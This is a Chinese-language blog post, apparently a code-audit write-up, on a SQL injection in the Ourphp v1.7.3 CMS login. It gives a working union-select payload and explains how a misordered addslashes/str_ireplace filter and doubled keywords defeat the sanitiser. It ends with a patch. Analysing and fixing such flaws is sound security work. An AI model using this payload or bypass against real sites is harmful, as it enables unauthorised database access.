---
title: Ourphp v1.7.3 SQL Injection
date: 2017-09-10 15:53:49
tags:
	- SQL注入
	- 代码审计
---

跟着表哥学习学习(ง •_•)ง
<!-- more -->
## 0x00 漏洞产生原理
首先放上表哥给的Payload

	)union selselectect 1,user(),3,4,5-- p0'
通过Payload往上找漏洞点

	http://www.op.com/client/user/?cn-login.html
首先根据登录页面的url，找到在templates/user目录下的cn_login.html,然后在会员登录表单中，找到调用的php文件的路径，在第31行

	action="[.$webpath.]client/user/ourphp_play.class.php?ourphp_cms=login"

然后往上找到client/user目录中的ourphp_play.class.php，在第184行，将post传入的参数带入了数据库查询语句

	$ourphp_rs = $db -> select("`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`","`ourphp_user`","WHERE (`OP_Useremail` = '".dowith_sql($_POST["OP_Useremail"])."' || `OP_Usertel` = '".dowith_sql($_POST["OP_Useremail"])."') and `OP_Userpass` = '".dowith_sql(substr(md5(md5($_REQUEST["OP_Userpass"])),0,16))."'");

在其中使用了"dowith_sql()"函数将参数进行了过滤，很明显是自定义函数，定位一下，在function目录下的ourphp_function.php文件中的第10行.

审计一下所谓的防注入函数，可以看到开发人员在此犯了一个严重的错误。首先使用addslashes()函数将一些敏感字符，比如单引号进行了转义，但是，在后续处理中又将单引号使用str_ireplace()函数替换掉了，这就相当于传入的单引号变成了反斜杠"\"。

	第11行
	$ourphpstr = addslashes($ourphpstr);
	第35行
	$ourphpstr = str_ireplace("'","",$ourphpstr);
	

这个漏洞和前段时间的国赛中的一个Web题一样，题目是
	
	wanna to see your hat?
解题过程：

	http://iwenhu.cn/2017/07/12/%E5%9B%BD%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AAWeb%E9%A2%98.html

而且在这个防注入函数中，开发者采用的一大串的str_ireplace函数来替换黑名单中的字符，有很大一部分是没有意义的，简单的双写一下就可以绕过.

	比如 cocountunt,在里面一替换，就成了count
在这时，payload经过函数处理，变成了

	)union select 1,user(),3,4,5-- p0\
这时带入了SQL查询语句中
	
	select("`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`","`ourphp_user`","WHERE (`OP_Useremail` = ')union select 1,user(),3,4,5-- p0\' || `OP_Usertel` = ')union select 1,user(),3,4,5-- p0\') and `OP_Userpass` = '".dowith_sql(substr(md5(md5($_REQUEST["OP_Userpass"])),0,16))."'");

在这个语句中，因为最后面的那个单引号被处理成了反斜杠\,然后反斜杠将语句末尾的单引号转义，使得

	(`OP_Useremail` = ')union select 1,user(),3,4,5-- p0\' || `OP_Usertel` = ')

通过Mysql监控工具可以找到执行的SQL语句
	
	select `id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username` from `ourphp_user` WHERE (`OP_Useremail` = ')union select 1,user(),3,4,5-- p0\' || `OP_Usertel` = ')union select 1,user(),3,4,5-- p0\') and `OP_Userpass` = 'd9b1d7db4cd6e709'
在这里OP_Useremail为

	)union select 1,user(),3,4,5-- p0\' || `OP_Usertel` =
	
语句中的union select执行了。后面的密码处理的语句都被注释符"-- "注释掉了。这样就构成了一个SQL注入漏洞。


## 0x01 修补方案
	
该漏洞最主要的原因是waf的处理逻辑有问题，可以把

	$ourphpstr = str_ireplace("'","",$ourphpstr);
放到

	$ourphpstr = addslashes($ourphpstr);
的前面，先处理单引号，再转义敏感字符。这样的话漏洞就被处理掉了。

对于双写绕过呢，可以用递归的方式检查参数，在牺牲小部分性能的情况下来获取服务器的安全，就是检查，过滤，检查，过滤，直到检查通过为止。
